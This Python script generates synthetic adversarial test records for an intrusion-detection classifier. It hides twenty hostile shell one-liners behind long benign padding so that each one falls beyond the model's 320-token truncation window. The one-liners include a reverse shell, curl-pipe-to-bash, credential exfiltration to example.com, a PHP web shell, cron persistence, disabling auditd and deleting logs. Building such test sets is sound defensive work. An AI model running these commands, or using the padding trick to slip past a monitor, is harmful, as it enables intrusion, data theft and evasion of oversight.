#!/usr/bin/env python3
"""Generate synthetic long-prefix adversarial candidates for HyperIDs v3.

The adversarial property is input-boundary exploitation: command text beyond the
model's 320-token truncation window is invisible to the classifier. The payloads
are lab placeholders and must never be executed.
"""
from __future__ import annotations

import json
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
OUT = ROOT / "adversarial" / "raw" / "r3_long_prefix.jsonl"

BENIGN_LINES = [
    "record maintenance start marker {i}",
    "verify local worker status",
    "print environment label",
    "rotate transient cache entry",
    "sync buffered metadata",
    "check queue depth",
    "refresh local manifest",
    "report heartbeat timestamp",
    "validate temporary output",
    "write status marker",
    "clean stale state file",
    "emit routine diagnostic line",
    "confirm expected directory layout",
    "wait briefly for pending file handles",
    "print completion marker",
]

PAYLOADS = [
    (
        "reverse_shell",
        "reverse_shell",
        "Starts an outbound interactive shell to a documentation-only test address.",
        "bash -c 'exec 3<>/dev/tcp/192.0.2.{octet}/4444; cat <&3 & cat >&3'",
    ),
    (
        "bind_shell",
        "bind_shell",
        "Exposes an interactive shell on localhost for subsequent access.",
        "socat TCP-LISTEN:4445,reuseaddr,fork EXEC:/bin/bash",
    ),
    (
        "download_execute",
        "download_execute",
        "Downloads and executes a remote lab payload.",
        "curl -fsS http://example.com/lab/payload-{octet}.sh | bash",
    ),
    (
        "obfuscation",
        "obfuscate",
        "Decodes and executes an encoded lab command.",
        "printf '%s' 'YmFzaCAtYyAnaWQnCg==' | base64 -d | sh",
    ),
    (
        "persistence",
        "schedule_persist",
        "Installs a startup command in a synthetic cron fragment.",
        "(crontab -l 2>/dev/null; echo '@reboot /tmp/hids-lab/runner-{octet}.sh') | crontab -",
    ),
    (
        "service_manipulation",
        "service_persist",
        "Creates a user-level service unit for a lab runner.",
        "printf '[Service]\\nExecStart=/tmp/hids-lab/runner-{octet}.sh\\n' > /tmp/hids-lab/unit-{octet}.service",
    ),
    (
        "web_shell",
        "web_shell",
        "Writes a web-accessible command endpoint under a synthetic web root.",
        "printf '<?php system($_GET[\"c\"]); ?>' > /tmp/hids-lab/www/endpoint-{octet}.php",
    ),
    (
        "credential_dump",
        "credential_dump",
        "Collects synthetic credential material from a lab configuration directory.",
        "grep -R -h -E 'pass(word|phrase)|token' /tmp/hids-lab/config-{octet} > /tmp/hids-lab/creds-{octet}.txt",
    ),
    (
        "credential_exfiltration",
        "exfiltrate",
        "Stages and sends synthetic credential material to a test endpoint.",
        "tar czf - /tmp/hids-lab/creds-{octet}.txt | base64 | curl -fsS -X POST --data-binary @- http://example.com/upload/{octet}",
    ),
    (
        "security_disable",
        "disable_security",
        "Stops a lab audit service and weakens monitoring.",
        "systemctl stop auditd 2>/dev/null || true; systemctl disable auditd 2>/dev/null || true",
    ),
    (
        "log_tampering",
        "clear_logs",
        "Removes synthetic trace files from a lab directory.",
        "find /tmp/hids-lab/logs-{octet} -type f -name '*.log' -delete",
    ),
    (
        "timestomp",
        "timestomp",
        "Changes timestamps on a synthetic artifact to hide ordering.",
        "touch -d '2020-01-01 00:00:00' /tmp/hids-lab/artifact-{octet}.bin",
    ),
    (
        "account_creation",
        "account_add",
        "Creates a synthetic local account for persistence.",
        "useradd -M -s /bin/bash lab_operator_{octet}",
    ),
    (
        "discovery",
        "network_scan",
        "Probes documentation-only hosts for open services.",
        "for h in 192.0.2.10 198.51.100.20; do timeout 1 bash -c '</dev/tcp/'$h'/80' 2>/dev/null && echo open:$h; done",
    ),
    (
        "self_propagation",
        "self_propagate",
        "Copies a synthetic runner to another documentation-only host.",
        "scp -o StrictHostKeyChecking=no /tmp/hids-lab/runner-{octet}.sh lab@192.0.2.{octet}:/tmp/",
    ),
    (
        "privilege_escalation",
        "process_inject",
        "Uses an interpreter escape through a privileged utility for a lab shell.",
        "sudo -n /usr/bin/perl -e 'exec \"/bin/sh\"'",
    ),
    (
        "cryptomining",
        "cryptomining",
        "Launches a synthetic resource-consuming worker against a test pool.",
        "/tmp/hids-lab/xmrig-like --url pool.example.com:3333 --user lab{octet} --background",
    ),
    (
        "impact",
        "ransomware",
        "Renames synthetic files in place as a non-destructive ransomware stand-in.",
        "find /tmp/hids-lab/data-{octet} -type f -exec sh -c 'mv \"$1\" \"$1.locked\"' _ {} \\;",
    ),
    (
        "keylogging",
        "keylog",
        "Records a synthetic interactive session to a lab file.",
        "script -q -a /tmp/hids-lab/session-{octet}.log -c 'bash'",
    ),
    (
        "history_evasion",
        "environment_setup",
        "Disables command-history persistence for the current shell.",
        "export HISTFILE=/dev/null; unset HISTFILESIZE HISTSIZE",
    ),
]


def make_prefix(i: int) -> str:
    lines = [
        f"# maintenance batch {i:04d}: routine local status check",
        "# scope: temporary worker state only",
        "# no external services are contacted by this section",
    ]
    for j in range(120):
        phrase = BENIGN_LINES[(i + j) % len(BENIGN_LINES)].format(i=i)
        lines.append(f"printf '[routine {i:04d}:{j:03d}] {phrase}\\n'")
    lines.append(": # end of routine section")
    return "\n".join(lines) + "\n"


def main() -> None:
    OUT.parent.mkdir(parents=True, exist_ok=True)
    count = 0
    with OUT.open("w", encoding="utf-8") as f:
        for i in range(1, 1501):
            fam, action_family, intent, payload = PAYLOADS[(i - 1) % len(PAYLOADS)]
            octet = 10 + (i % 200)
            command = make_prefix(i) + payload.replace("{octet}", str(octet)) + "\n"
            rec = {
                "id": f"r3lp-{i:04d}",
                "category": fam,
                "attack_family": action_family,
                "intent": intent,
                "command": command,
                "evasion_strategy": "payload_after_320_token_truncation_window",
                "rationale": "The visible prefix contains only routine status output; the malicious action follows the classifier truncation boundary.",
                "severity_expected": "high",
                "synthetic": True,
                "ground_truth": "malicious",
            }
            f.write(json.dumps(rec, ensure_ascii=False) + "\n")
            count += 1
    print(f"wrote {count} candidates to {OUT}")


if __name__ == "__main__":
    main()
